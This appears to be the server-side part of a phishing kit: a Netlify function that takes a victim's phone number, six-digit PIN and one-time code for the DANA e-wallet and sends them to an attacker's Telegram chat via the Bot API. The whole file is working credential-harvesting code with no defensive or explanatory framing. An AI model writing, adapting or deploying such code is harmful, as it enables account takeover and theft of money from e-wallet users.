// netlify/functions/send-dana-data.js
const axios = require('axios');

exports.handler = async (event) => {
  // Only allow POST requests
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    const { type, phone, pin, otp } = JSON.parse(event.body);

    // Input validation
    if (!type || !phone) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Nomor HP wajib diisi' })
      };
    }

    if (type === 'pin' && (!pin || pin.length !== 6)) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'PIN harus 6 digit' })
      };
    }

    if (type === 'otp' && !otp) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'OTP wajib diisi' })
      };
    }

    // Format message for Telegram
    const message = formatMessage(type, phone, pin, otp);

    // Send to Telegram
    await axios.post(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      }
    );

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true })
    };

  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ 
        error: 'Terjadi kesalahan server',
        details: error.message 
      })
    };
  }
};

function formatMessage(type, phone, pin, otp) {
  const formattedPhone = phone.replace(/(\d{3})(\d{4})(\d{3})/, '$1-$2-$3');
  let message = `<b>DANA E-WALLET</b>\n` +
                `┏━━━━━━━━━━━━━━\n` +
                `┠ <b>📱 Nomor HP:</b> ${formattedPhone}\n`;

  if (type === 'pin' && pin) {
    message += `┠━━━━━━━━━━━━━━\n` +
               `┠ <b>🔑 PIN:</b> ${pin}\n`;
  }

  if (type === 'otp' && otp) {
    message += `┠━━━━━━━━━━━━━━\n` +
               `┠ <b>🔢 OTP:</b> ${otp}\n`;
  }

  message += `┗━━━━━━━━━━━━━━`;
  return message;
}
